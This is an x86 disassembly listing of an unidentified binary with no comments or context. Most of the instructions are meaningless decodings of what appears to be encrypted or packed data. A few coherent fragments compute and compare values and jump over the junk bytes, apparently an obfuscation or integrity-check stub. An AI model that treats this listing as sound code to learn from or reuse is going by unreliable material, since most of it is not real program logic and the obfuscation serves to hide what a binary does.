  40bf1f:	dec    esi
  40bf20:	mov    al,cl
  40bf22:	sbb    al,0x8b
  40bf24:	cdq    
  40bf25:	mov    fs,WORD PTR [ebx-0xa]
  40bf28:	lds    edi,FWORD PTR [edx+0x43]
  40bf2b:	or     edi,DWORD PTR [ebp-0x5d]
  40bf2e:	imul   edx,eax,0xe5ef843f
  40bf34:	ss sub DWORD PTR ss:[ecx+0x37cdfd80],edi
  40bf3c:	xchg   ebp,eax
  40bf3d:	xor    edi,DWORD PTR [edi-0x3631c4bc]
  40bf43:	stos   DWORD PTR es:[edi],eax
  40bf44:	popf   
  40bf45:	xor    ebp,ebx
  40bf47:	pop    esi
  40bf48:	mov    ebx,?
  40bf4a:	adc    edi,ebp
  40bf4c:	sahf   
  40bf4d:	lea    edi,[eax-0x5c6ce42a]
  40bf53:	lods   al,BYTE PTR ds:[esi]
  40bf54:	ds cmp ch,dh
  40bf57:	jge    0x40bf42
  40bf59:	shl    DWORD PTR [ecx+0x5381ef2e],0x48
  40bf60:	cli    
  40bf61:	sbb    BYTE PTR [esi+0x48c6b530],cl
  40bf67:	out    0xd,al
  40bf69:	mov    ecx,0x3cb3b383
  40bf6e:	mov    eax,0x49b53d55
  40bf73:	push   ss
  40bf74:	jae    0x40bf4f
  40bf76:	xchg   ebp,eax
  40bf77:	sbb    esi,DWORD PTR [edx+0xf]
  40bf7a:	fisub  WORD PTR [eax+0x5b1ae6d4]
  40bf80:	push   edi
  40bf81:	popa   
  40bf82:	push   edx
  40bf83:	jnp    0x40bf10
  40bf85:	jge    0x40bf8f
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	mov    esi,0x3e5e5023
  40bfc2:	xchg   esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	ins    DWORD PTR es:[edi],dx
  40bfca:	jns    0x40bfb6
  40bfcc:	ret    
  40bfcd:	xor    BYTE PTR [ebx-0x74],dh
  40bfd0:	sbb    bh,BYTE PTR [esi+0x5f]
  40bfd3:	call   0x4c94aa72
  40bfd8:	fwait
  40bfd9:	sub    bh,BYTE PTR [ecx-0x37]
  40bfdc:	pop    ss
  40bfdd:	mov    dl,0x90
  40bfdf:	pop    ds
  40bfe0:	outs   dx,BYTE PTR ds:[esi]
  40bfe1:	mov    ebp,0x43942099
  40bfe6:	clc    
  40bfe7:	ret    
  40bfe8:	loope  0x40c067
  40bfea:	loope  0x40bf73
  40bfec:	ins    DWORD PTR es:[edi],dx
  40bfed:	sub    ah,BYTE PTR [ebp+0x10]
  40bff0:	loopne 0x40bfbc
  40bff2:	sbb    BYTE PTR [edi-0x46],al
  40bff5:	scas   eax,DWORD PTR es:[edi]
  40bff6:	pop    edx
  40bff7:	dec    ebx
  40bff8:	jo     0x40c067
  40bffa:	and    eax,0xab730ce
  40bfff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c000:	fyl2xp1 
  40c002:	das    
  40c003:	cs pop eax
  40c005:	mov    edx,0xd14287d0
  40c00a:	push   ecx
  40c00b:	int3   
  40c00c:	test   DWORD PTR [ebp+0x3b],0x95fc31fa
  40c013:	and    ebp,DWORD PTR [edx-0x13]
  40c016:	call   0x48df:0x959f072c
  40c01d:	std    
  40c01e:	mul    DWORD PTR [esi+0x12]
  40c021:	jns    0x40c04f
  40c023:	aas    
  40c024:	es inc ebx
  40c026:	(bad)  
  40c027:	adc    DWORD PTR [ebx+0x2c1057e],ebx
  40c02d:	adc    ch,BYTE PTR [esi]
  40c02f:	std    
  40c030:	jmp    0x7323:0xc54d195b
  40c037:	pop    esi
  40c038:	das    
  40c039:	add    dl,al
  40c03b:	dec    edi
  40c03c:	and    BYTE PTR [ebp+0x33],cl
  40c03f:	pop    esp
  40c040:	nop
  40c041:	pop    esp
  40c042:	xchg   esp,eax
  40c043:	inc    eax
  40c044:	inc    edi
  40c045:	add    eax,0x355fd0bd
  40c04a:	es sub al,0xc4
  40c04d:	push   edx
  40c04e:	scas   al,BYTE PTR es:[edi]
  40c04f:	adc    eax,DWORD PTR [eax+0x4029226f]
  40c055:	stc    
  40c056:	adc    BYTE PTR [esi-0x2f],cl
  40c059:	std    
  40c05a:	and    ebp,ebp
  40c05c:	cmp    ecx,DWORD PTR [ebx+edx*8]
  40c05f:	mov    ah,BYTE PTR [ebx-0x3baa00db]
  40c065:	ret    
  40c066:	pop    ss
  40c067:	clc    
  40c068:	je     0x40c009
  40c06a:	mov    esi,DWORD PTR [ebx+0x2d]
  40c06d:	adc    eax,0xd80f6d59
  40c072:	imul   ebp,DWORD PTR [edx],0x47b03d8a
  40c078:	das    
  40c079:	adc    al,0x9a
  40c07b:	sbb    al,0x7e
  40c07d:	nop
  40c07e:	jno    0x40c0cc
  40c080:	add    eax,0x4e827667
  40c085:	imul   edi,DWORD PTR [ebx+0x3a32239e],0x94a39e70
  40c08f:	leave  
  40c090:	lds    ebx,FWORD PTR [edx]
  40c092:	sbb    edi,DWORD PTR [edi+0x2f4b1032]
  40c098:	mov    ebp,0xbe2aaac9
  40c09d:	pop    eax
  40c09e:	div    bh
  40c0a0:	pop    ss
  40c0a1:	stos   BYTE PTR es:[edi],al
  40c0a2:	push   ds
  40c0a3:	pushf  
  40c0a4:	mov    edx,?
  40c0a6:	cmp    al,0x44
  40c0a8:	mov    eax,ds:0x9264cbc0
  40c0ad:	retf   0x3af5
  40c0b0:	inc    edi
  40c0b1:	dec    edi
  40c0b2:	rol    BYTE PTR [edi+edi*1],1
  40c0b5:	inc    eax
  40c0b6:	loope  0x40c0fd
  40c0b8:	cld    
  40c0b9:	jb     0x40c12f
  40c0bb:	mov    eax,ds:0xe4d35320
  40c0c0:	test   DWORD PTR [edx-0x29],eax
  40c0c3:	rcr    BYTE PTR [eax+0x6d50f1d5],0x80
  40c0ca:	dec    esp
  40c0cb:	jl     0x40c0d2
  40c0cd:	cwde   
  40c0ce:	mov    BYTE PTR [edi+eax*2-0x10],0x1c
  40c0d3:	mov    edi,ecx
  40c0d5:	in     eax,0x1e
  40c0d7:	nop
  40c0d8:	popa   
  40c0d9:	sub    eax,0xc5b2e3ab
  40c0de:	loopne 0x40c122
  40c0e0:	inc    ecx
  40c0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0e3:	test   DWORD PTR [edi+edx*8],esi
  40c0e6:	std    
  40c0e7:	sbb    DWORD PTR [ebp-0x3],ebp
  40c0ea:	xchg   BYTE PTR [eax+0x10c590d5],cl
  40c0f0:	and    eax,0x6db78720
  40c0f5:	fstp   TBYTE PTR [edi+ecx*2-0x7a]
  40c0f9:	push   ecx
  40c0fa:	call   0x24d8:0x115e0d0e
  40c101:	mov    ah,0xa1
  40c103:	jecxz  0x40c110
  40c105:	ficomp DWORD PTR [ecx+0x322bad55]
  40c10b:	(bad)  
  40c10c:	jno    0x40c0c5
  40c10e:	das    
  40c10f:	dec    esp
  40c110:	test   al,0xe
  40c112:	imul   eax,DWORD PTR [ebx-0x78],0xffffff81
  40c116:	cli    
  40c117:	bound  ebp,QWORD PTR ds:0xc3cc81a8
  40c11d:	push   ss
  40c11e:	shr    BYTE PTR ds:[ebp-0x11352f68],1
  40c125:	push   edi
  40c126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c127:	add    esp,DWORD PTR [edx-0x158bb9c2]
  40c12d:	sar    BYTE PTR [edi],cl
  40c12f:	fisubr WORD PTR [edi+edx*4]
  40c132:	xor    al,0x6f
  40c134:	fstp   TBYTE PTR ds:0xc8eca88e
  40c13a:	hlt    
  40c13b:	js     0x40c0dd
  40c13d:	stos   DWORD PTR es:[edi],eax
  40c13e:	inc    edi
  40c13f:	push   ds
  40c140:	ds int 0xf6
  40c143:	jecxz  0x40c15c
  40c145:	(bad)  
  40c146:	into   
  40c147:	jno    0x40c1c4
  40c149:	sbb    cl,ch
  40c14b:	ja     0x40c176
  40c14d:	mov    eax,ds:0x14a56628
  40c152:	pop    edi
  40c153:	pop    ebx
  40c154:	fwait
  40c155:	retf   
  40c156:	test   BYTE PTR [edx],al
  40c158:	ins    BYTE PTR es:[edi],dx
  40c159:	fimul  WORD PTR [edx+0x30]
  40c15c:	ja     0x40c164
  40c15e:	iret   
  40c15f:	add    BYTE PTR [ebp+ebx*4-0x107f1254],ah
  40c166:	adc    BYTE PTR [ecx-0x54],cl
  40c169:	mov    esp,0xb0f7977f
  40c16e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c16f:	iret   
  40c170:	data16 loope 0x40c13b
  40c173:	jnp    0x40c123
  40c175:	mov    esi,0x7fb9dd97
  40c17a:	int3   
  40c17b:	aaa    
  40c17c:	inc    ecx
  40c17d:	out    dx,eax
  40c17e:	ins    BYTE PTR es:[edi],dx
  40c17f:	cmp    eax,0x8a2963df
  40c184:	jnp    0x40c180
  40c186:	js     0x40c1f2
  40c188:	outs   dx,BYTE PTR ds:[esi]
  40c189:	mov    esp,0xc44dff61
  40c18e:	cmp    DWORD PTR [ecx+esi*4-0x23f3fc09],ecx
  40c195:	xor    al,0x9d
  40c197:	jae    0x40c150
  40c199:	mov    ebp,0x8e673be4
  40c19e:	dec    esi
  40c19f:	mov    edx,0xecf92f9e
  40c1a4:	stc    
  40c1a5:	push   ds
  40c1a6:	mov    eax,0x11473fb
  40c1ab:	xor    ch,cl
  40c1ad:	in     eax,0x63
  40c1af:	fistp  WORD PTR [edi+edx*2+0x47]
  40c1b3:	and    bl,BYTE PTR [edi+0x18]
  40c1b6:	nop
  40c1b7:	xchg   ebx,eax
  40c1b8:	outs   dx,BYTE PTR ds:[esi]
  40c1b9:	cmp    al,BYTE PTR [ebx]
  40c1bb:	sub    esp,DWORD PTR [edx]
  40c1bd:	icebp  
  40c1be:	mov    ss:0x971ce408,al
  40c1c4:	xor    eax,0x5aa14228
  40c1c9:	das    
  40c1ca:	js     0x40c1aa
  40c1cc:	ud2    
  40c1ce:	(bad)  
  40c1d0:	xchg   ecx,eax
  40c1d1:	out    dx,eax
  40c1d2:	mov    eax,ds:0x9dec80fc
  40c1d7:	mov    cl,0x8a
  40c1d9:	or     al,0x90
  40c1db:	shl    BYTE PTR [ecx+0x5a8de2b0],0xb9
  40c1e2:	fld    QWORD PTR [edi]
  40c1e4:	cmp    DWORD PTR ds:0xa43e3c4c,edx
  40c1ea:	jle    0x40c19d
  40c1ec:	mov    ecx,0xe0d821e0
  40c1f1:	adc    al,0xa
  40c1f3:	das    
  40c1f4:	or     bl,BYTE PTR [ebp+0x1cf53ef9]
  40c1fa:	int    0x96
  40c1fc:	jmp    0x40c264
  40c1fe:	test   DWORD PTR [edx+0x1f3fb049],esi
  40c204:	mov    ecx,?
  40c206:	(bad)  
  40c207:	pushf  
  40c208:	int3   
  40c209:	dec    ebp
  40c20a:	jnp    0x40c208
  40c20c:	setl   BYTE PTR [edi-0x65]
  40c210:	iret   
  40c211:	xchg   esp,eax
  40c212:	sbb    DWORD PTR [ebp-0x9],ecx
  40c215:	pop    ds
  40c216:	mov    esp,0x16aa2a67
  40c21b:	leave  
  40c21c:	fistp  QWORD PTR [edi+ecx*1]
  40c21f:	add    dl,BYTE PTR [esi+0x2991a0bc]
  40c225:	push   0x37f60621
  40c22a:	jae    0x40c296
  40c22c:	ja     0x40c29d
  40c22e:	jge    0x40c1ed
  40c230:	cmp    BYTE PTR [eax+eax*2+0x1e5ae3da],dh
  40c237:	das    
  40c238:	shl    DWORD PTR [edx+eax*2-0x3ca6fc0d],1
  40c23f:	push   0xd2cf8aae
  40c244:	imul   edx,DWORD PTR [esi-0x69],0x83b98b92
  40c24b:	or     BYTE PTR [eax],0x6e
  40c24e:	sbb    ah,cl
  40c250:	(bad)  
  40c251:	outs   dx,DWORD PTR ds:[esi]
  40c252:	test   DWORD PTR [ecx],ecx
  40c254:	jmp    0x40c221
  40c256:	das    
  40c257:	mov    ecx,0xdd03fa04
  40c25c:	in     eax,dx
  40c25d:	mov    eax,0xcf41c6b1
  40c262:	add    edx,DWORD PTR [ebp+0x5c]
  40c265:	jbe    0x40c1ee
  40c267:	(bad)  
  40c268:	mov    ?,WORD PTR [eax-0x4c]
  40c26b:	add    DWORD PTR [ebp+0x47],ebp
  40c26e:	fimul  WORD PTR [esp+edx*1]
  40c271:	loop   0x40c27f
  40c273:	pop    edi
  40c274:	test   ebx,eax
  40c276:	jae    0x40c2cb
  40c278:	rol    DWORD PTR ds:0xc3a10b4d,0x2a
  40c27f:	mov    al,0xe7
  40c281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c282:	and    edi,DWORD PTR [esi-0x2d6a9492]
  40c288:	cs jmp 0x10a4dad
  40c28e:	cmp    DWORD PTR [ebx],edi
  40c290:	mov    DWORD PTR [ecx-0x11cd9572],edi
  40c296:	mov    dh,0x67
  40c298:	xor    ebp,ecx
  40c29a:	jge    0x40c2b0
  40c29c:	sub    BYTE PTR [edx+0x35871a89],al
  40c2a2:	or     edi,ebp
  40c2a4:	inc    edi
  40c2a5:	fld    DWORD PTR [edi+0x11786378]
  40c2ab:	sub    BYTE PTR [ebx-0x36],ch
  40c2ae:	pop    esi
  40c2af:	sub    BYTE PTR ds:0x3ab81dcd,dh
  40c2b5:	pop    esi
  40c2b6:	adc    BYTE PTR [edx+0x34746b9e],bl
  40c2bc:	(bad)  
  40c2bd:	outs   dx,BYTE PTR ds:[esi]
  40c2be:	xor    eax,0x4b7c2ece
  40c2c3:	xchg   esp,eax
  40c2c4:	xchg   edi,eax
  40c2c5:	mov    eax,DWORD PTR [ebp-0x28]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x51],bh
  40c2e3:	cwde   
  40c2e4:	dec    ebp
  40c2e5:	and    eax,0x78789b3a
  40c2ea:	je     0x40c36a
  40c2ec:	js     0x40c366
  40c2ee:	ret    0xd0c7
  40c2f1:	xor    DWORD PTR [edi-0x29],0x7daadc3a
  40c2f8:	bound  ecx,QWORD PTR [ebp-0x1b]
  40c2fb:	ja     0x40c2f8
  40c2fd:	or     al,0x68
  40c2ff:	test   dl,ah
  40c301:	gs xchg esp,eax
  40c303:	rcl    ebp,1
  40c305:	jg     0x40c28b
  40c307:	fwait
  40c308:	add    esi,ebx
  40c30a:	mov    cl,0xa7
  40c30c:	inc    eax
  40c30d:	xchg   esi,eax
  40c30e:	xchg   cl,dl
  40c310:	or     BYTE PTR [edi],ch
  40c312:	push   0x59
  40c314:	xor    eax,0x34b14cf6
  40c319:	in     eax,dx
  40c31a:	enter  0x9909,0x4c
  40c31e:	push   ss
  40c31f:	add    BYTE PTR [ebp+0x6be42156],al
  40c325:	cld    
  40c326:	mov    ah,0x85
  40c328:	push   cs
  40c329:	dec    esp
  40c32a:	daa    
  40c32b:	jb     0x40c34a
  40c32d:	push   cs
  40c32e:	add    edi,DWORD PTR [edi-0x6b]
  40c331:	or     eax,0x726563dd
  40c336:	in     al,dx
  40c337:	or     DWORD PTR [ebp+0x4064363c],ecx
  40c33d:	or     dl,BYTE PTR [ecx]
  40c33f:	cmp    edi,DWORD PTR [eax+0x76d0f4d1]
  40c345:	jecxz  0x40c37d
  40c347:	into   
  40c348:	lahf   
  40c349:	jecxz  0x40c2fd
  40c34b:	out    dx,al
  40c34c:	loop   0x40c2fa
  40c34e:	xchg   ebp,eax
  40c34f:	sub    eax,0xd8566516
  40c354:	mov    edi,0xf81c3384
  40c359:	stos   DWORD PTR es:[edi],eax
  40c35a:	inc    eax
  40c35b:	push   ecx
  40c35c:	mov    ebx,DWORD PTR [ebx-0x1f045bf8]
  40c362:	inc    ecx
  40c363:	xchg   esi,eax
  40c364:	inc    ebx
  40c365:	xchg   edi,eax
  40c366:	dec    ecx
  40c367:	jecxz  0x40c352
  40c369:	or     DWORD PTR [ecx-0x43],esp
  40c36c:	mov    ebx,0xf74e5486
  40c371:	jno    0x40c317
  40c373:	push   esp
  40c374:	dec    esi
  40c375:	add    edi,DWORD PTR [ebp+ebp*2-0x51]
  40c379:	dec    ebp
  40c37a:	xchg   esi,eax
  40c37b:	mov    edx,DWORD PTR [edi+edi*1+0xb]
  40c37f:	(bad)  
  40c380:	lea    ebp,[esi]
  40c382:	ret    0x3caa
  40c385:	adc    eax,0x70e03a23
  40c38a:	push   eax
  40c38b:	out    0x2a,eax
  40c38d:	xchg   esp,eax
  40c38e:	pop    edx
  40c38f:	fs js  0x40c3d1
  40c392:	loop   0x40c406
  40c394:	sub    BYTE PTR [ebx],cl
  40c396:	fwait
  40c397:	dec    eax
  40c398:	xlat   BYTE PTR ds:[ebx]
  40c399:	fst    QWORD PTR [eax+0x3aa3f827]
  40c39f:	push   esp
  40c3a0:	out    0x31,eax
  40c3a2:	xor    eax,0x33d31660
  40c3a7:	sahf   
  40c3a8:	mov    esi,0x579ac040
  40c3ad:	cmp    eax,0x2a9ce54a
  40c3b2:	loop   0x40c387
  40c3b4:	das    
  40c3b5:	retf   0x349f
  40c3b8:	test   al,0x67
  40c3ba:	(bad)  
  40c3bb:	retf   0x203b
  40c3be:	cmp    BYTE PTR [edi-0xc],bl
  40c3c1:	xchg   ebx,eax
  40c3c2:	adc    cl,BYTE PTR [ebp+0x6e853ed0]
  40c3c8:	outs   dx,BYTE PTR ds:[esi]
  40c3c9:	inc    si
  40c3cb:	and    BYTE PTR [edi+0x7b],0x24
  40c3cf:	pop    ecx
  40c3d0:	test   BYTE PTR [ecx],0xa9
  40c3d3:	xor    al,0x9b
  40c3d5:	pop    edx
  40c3d6:	sbb    cl,BYTE PTR ds:0xbe1299e8
  40c3dc:	daa    
  40c3dd:	sti    
  40c3de:	es pop ebx
  40c3e0:	push   0x632f407b
  40c3e5:	popf   
  40c3e6:	mov    edx,ds
  40c3e8:	xor    edi,0x385c4016
  40c3ee:	test   ebp,eax
  40c3f0:	xor    BYTE PTR es:[eax],bl
  40c3f3:	bound  esp,QWORD PTR [ebx]
  40c3f5:	aam    0x4
  40c3f7:	or     cl,BYTE PTR [edi+edx*4+0x38fd5c6]
  40c3fe:	cs inc edi
  40c400:	ffreep st(2)
  40c402:	mov    ch,0x45
  40c404:	mov    ?,edi
  40c406:	jge    0x40c433
  40c408:	pop    ds
  40c409:	jo     0x40c3f3
  40c40b:	dec    eax
  40c40c:	fiadd  WORD PTR fs:[ebp+0x1d554d2d]
  40c413:	cmp    eax,0x12c3e6d7
  40c418:	adc    DWORD PTR [eax-0x711ddb1b],ebx
  40c41e:	and    DWORD PTR [eax+0x14],ebp
  40c421:	pop    ecx
  40c422:	ret    
  40c423:	mov    ds:0x7e287c2f,al
  40c428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c429:	mov    ?,WORD PTR [edx+0x2faaf7b6]
  40c42f:	ret    0x4bc0
  40c432:	sbb    edi,DWORD PTR [ecx-0x35]
  40c435:	inc    esp
  40c436:	push   edi
  40c437:	int3   
  40c438:	adc    ah,BYTE PTR [eax+0x5d]
  40c43b:	test   al,0x16
  40c43d:	pop    esp
  40c43e:	arpl   WORD PTR [ebp-0x1e],si
  40c441:	pusha  
  40c442:	add    ch,BYTE PTR [ecx+0x74]
  40c445:	test   eax,0x92fe0120
  40c44a:	pop    ebp
  40c44b:	sub    BYTE PTR [edi],al
  40c44d:	mov    ds:0x168aaf2f,eax
  40c452:	fsubr  QWORD PTR [edi]
  40c454:	cmp    DWORD PTR [esi-0x2],esi
  40c457:	ret    
  40c458:	or     eax,0x8d6e82ec
  40c45d:	imul   ebx,DWORD PTR [ebp+0x55f26c8b],0x3d
  40c464:	(bad)  
  40c465:	(bad)  
  40c466:	popa   
  40c467:	inc    eax
  40c468:	jmp    0x32d77768
  40c46d:	pop    ecx
  40c46e:	inc    ecx
  40c46f:	lods   al,BYTE PTR ds:[esi]
  40c470:	push   0x9440e937
  40c475:	je     0x40c4f4
  40c477:	and    eax,0x371d5651
  40c47c:	push   eax
  40c47d:	fwait
  40c47e:	mov    dh,0xa2
  40c480:	cmp    edi,DWORD PTR [ebx]
  40c482:	push   es
  40c483:	lods   eax,DWORD PTR ds:[esi]
  40c484:	cdq    
  40c485:	fmul   DWORD PTR [edx+ebx*2-0x6f60e6e1]
  40c48c:	inc    edi
  40c48d:	dec    ebx
  40c48e:	das    
  40c48f:	test   al,0x37
  40c491:	push   ebx
  40c492:	scas   al,BYTE PTR es:[edi]
  40c493:	pop    esp
  40c494:	pop    eax
  40c495:	cwde   
  40c496:	cmp    DWORD PTR [edi+0x6a],ebx
  40c499:	jne    0x40c448
  40c49b:	cmp    al,0x9a
  40c49d:	cdq    
  40c49e:	not    DWORD PTR [ebp+0x21832f]
  40c4a4:	fs jp  0x40c4ab
  40c4a7:	mov    al,0x46
  40c4a9:	call   0xc28:0xf7c42f07
  40c4b0:	push   edi
  40c4b1:	xchg   ch,dl
  40c4b3:	cmp    dl,BYTE PTR [ebx-0x48]
  40c4b6:	ss mov esi,es
  40c4b9:	mov    ds:0x50d6ec4,eax
  40c4be:	push   ds
  40c4bf:	sbb    eax,0xbd72b28
  40c4c4:	xor    edx,DWORD PTR fs:[ebp+0x4d]
  40c4c8:	jecxz  0x40c4ca
  40c4ca:	mov    eax,0xcd14bed1
  40c4cf:	mov    ecx,0x81acf87b
  40c4d4:	jmp    0x4c50f7bf
  40c4d9:	aaa    
  40c4da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4db:	xchg   DWORD PTR [edi],eax
  40c4dd:	out    0x8,al
  40c4df:	sub    ah,BYTE PTR [esi+edx*8]
  40c4e2:	jae    0x40c507
  40c4e4:	mov    ah,BYTE PTR [ebp+0x60]
  40c4e7:	call   0x92a8:0x18e104a3
  40c4ee:	mov    dl,0x7c
  40c4f0:	mov    ecx,0xd09cd6b4
  40c4f5:	xchg   esi,eax
  40c4f6:	test   eax,0x42fbb051
  40c4fb:	push   0x67
  40c4fd:	cs repnz xor eax,0x5fec5e9d
  40c504:	repnz push esi
  40c506:	arpl   WORD PTR [edi-0x5d],bp
  40c509:	jp     0x40c4d1
  40c50b:	mov    ebx,0x4fa3932e
  40c510:	mov    edx,DWORD PTR ds:0x229a089f
  40c516:	loopne 0x40c542
  40c518:	stos   BYTE PTR es:[edi],al
  40c519:	push   0xffffffd0
  40c51b:	fidiv  DWORD PTR [ecx]
  40c51d:	jmp    0xc6a8967e
  40c522:	push   ebx
  40c523:	jg     0x40c4f8
  40c525:	fimul  WORD PTR ds:0xee318cc1
  40c52b:	ror    ebx,cl
  40c52d:	retf   
  40c52e:	xchg   edi,eax
  40c52f:	sbb    eax,esi
  40c531:	sbb    esp,ebp
  40c533:	shl    DWORD PTR [esi],1
  40c535:	jl     0x40c582
  40c537:	je     0x40c4d5
  40c539:	loope  0x40c4df
  40c53b:	call   0xa0151320
  40c540:	dec    edx
  40c541:	adc    eax,DWORD PTR [eax+0x6efb94ff]
  40c547:	jno    0x40c56a
  40c549:	xor    al,0xa
  40c54b:	test   BYTE PTR [eax+0x2b],0x6b
  40c54f:	int    0x30
  40c551:	pop    ebp
  40c552:	add    eax,0x820ab17c
  40c557:	add    DWORD PTR [edx-0x4],0xffffffb3
  40c55b:	fstp   QWORD PTR [ecx+0x4ed2a896]
  40c561:	xchg   ebp,eax
  40c562:	and    DWORD PTR [esi-0x3aee2a09],ebx
  40c568:	adc    eax,0x967b4d97
  40c56d:	push   esp
  40c56e:	sbb    DWORD PTR [edi],edi
  40c570:	call   0xadd:0x575b46a8
  40c577:	gs repz je 0x40c5a0
  40c57b:	inc    eax
  40c57c:	push   0xffffffda
  40c57e:	mov    gs,WORD PTR [esi-0x19]
  40c581:	cmc    
  40c582:	imul   ebp,DWORD PTR [eax+0x5e077974],0x9f56a816
  40c58c:	aam    0xce
  40c58e:	mov    ds:0xc6951321,al
  40c593:	dec    edi
  40c594:	lods   eax,DWORD PTR ds:[esi]
  40c595:	in     al,0x9c
  40c597:	mov    edx,0x97eb6867
  40c59c:	dec    ebp
  40c59d:	or     eax,0x499c12aa
  40c5a2:	aam    0x48
  40c5a4:	in     ax,0xce
  40c5a7:	pop    edx
  40c5a8:	into   
  40c5a9:	adc    al,0xb4
  40c5ab:	jb     0x40c5cb
  40c5ad:	fnstcw WORD PTR [esp+edi*4]
  40c5b0:	test   al,0xc3
  40c5b2:	les    esp,FWORD PTR [ecx-0x42]
  40c5b5:	aad    0xbd
  40c5b7:	ret    
  40c5b8:	pop    esi
  40c5b9:	xchg   ebx,eax
  40c5ba:	sbb    BYTE PTR [edi+0x11],al
  40c5bd:	lahf   
  40c5be:	add    eax,0x67afa380
  40c5c3:	dec    edx
  40c5c4:	je     0x40c54f
  40c5c6:	mov    ecx,0xce969ce7
  40c5cb:	jno    0x40c5c4
  40c5cd:	fmul   DWORD PTR [esi-0x4a]
  40c5d0:	sti    
  40c5d1:	mov    bl,0x83
  40c5d3:	daa    
  40c5d4:	inc    eax
  40c5d5:	(bad)  
  40c5d6:	jge    0x40c62d
  40c5d8:	jbe    0x40c55e
  40c5da:	jb     0x40c56c
  40c5dc:	call   0xbbb0:0x8bacb187
  40c5e3:	or     al,0x67
  40c5e5:	push   es
  40c5e6:	(bad)  
  40c5e7:	cmc    
  40c5e8:	mov    cl,BYTE PTR [edi+0x66fb3366]
  40c5ee:	add    edi,edx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0xafd2d2f7
  40c613:	jns    0x40c5e8
  40c615:	fdiv   QWORD PTR [esi]
  40c617:	cwde   
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	jp     0x40c66d
  40c620:	cmp    al,0x5b
  40c622:	push   0x52556b63
  40c627:	aas    
  40c628:	cmc    
  40c629:	push   esi
  40c62a:	push   ss
  40c62b:	mov    edi,0x4b15010a
  40c630:	adc    eax,0xc1d8cd8c
  40c635:	xor    cl,BYTE PTR [edi+0x172c768f]
  40c63b:	xchg   BYTE PTR [esi+0x47],cl
  40c63e:	inc    edi
  40c63f:	jecxz  0x40c5dd
  40c641:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c642:	cdq    
  40c643:	icebp  
  40c644:	dec    edx
  40c645:	and    BYTE PTR ds:0xa44ef1a8,dl
  40c64b:	lahf   
  40c64c:	shl    DWORD PTR [esp+eiz*2+0x13],0xe4
  40c651:	jo     0x40c632
  40c653:	repz mov ds:0xd72b7347,al
  40c659:	dec    edi
  40c65a:	ja     0x40c628
  40c65c:	ficomp DWORD PTR [edi]
  40c65e:	outs   dx,BYTE PTR ds:[esi]
  40c65f:	bound  esp,QWORD PTR [eax+0x54]
  40c662:	stos   DWORD PTR es:[edi],eax
  40c663:	xchg   esi,eax
  40c664:	pop    ebp
  40c665:	and    eax,0x8afbff90
  40c66a:	jo     0x40c64a
  40c66c:	cwde   
  40c66d:	rcl    BYTE PTR [ebx+edi*2+0x71],1
  40c671:	add    DWORD PTR [eax],edx
  40c673:	les    ebx,FWORD PTR [esi+eax*2]
  40c676:	out    dx,al
  40c677:	or     al,0xa2
  40c679:	add    eax,0xefbb1953
  40c67e:	int    0x8
  40c680:	dec    eax
  40c681:	ret    0xaa78
  40c684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c685:	pusha  
  40c686:	sub    ebp,DWORD PTR [edx]
  40c688:	xor    bh,BYTE PTR [ecx+0x2e470006]
  40c68e:	loop   0x40c6fc
  40c690:	js     0x40c6e3
  40c692:	dec    ebp
  40c693:	sahf   
  40c694:	xchg   esi,ebp
  40c696:	mov    esp,0x59d89e8b
  40c69b:	and    al,0x72
  40c69d:	xchg   ebp,eax
  40c69e:	jge    0x40c63e
  40c6a0:	sti    
  40c6a1:	adc    al,0xfd
  40c6a3:	ror    DWORD PTR [edx+0x18],cl
  40c6a6:	adc    ebp,ecx
  40c6a8:	scas   eax,DWORD PTR es:[edi]
  40c6a9:	add    al,0xb
  40c6ab:	mov    al,0xee
  40c6ad:	add    ebx,DWORD PTR [edi+0x7cd2548e]
  40c6b3:	xchg   edx,eax
  40c6b4:	test   eax,0x26d0954d
  40c6b9:	cmp    edx,esp
  40c6bb:	or     esi,esp
  40c6bd:	xor    al,0xea
  40c6bf:	cwde   
  40c6c0:	outs   dx,DWORD PTR ds:[esi]
  40c6c1:	dec    edi
  40c6c2:	push   0xd03577a4
  40c6c7:	sub    al,0x2f
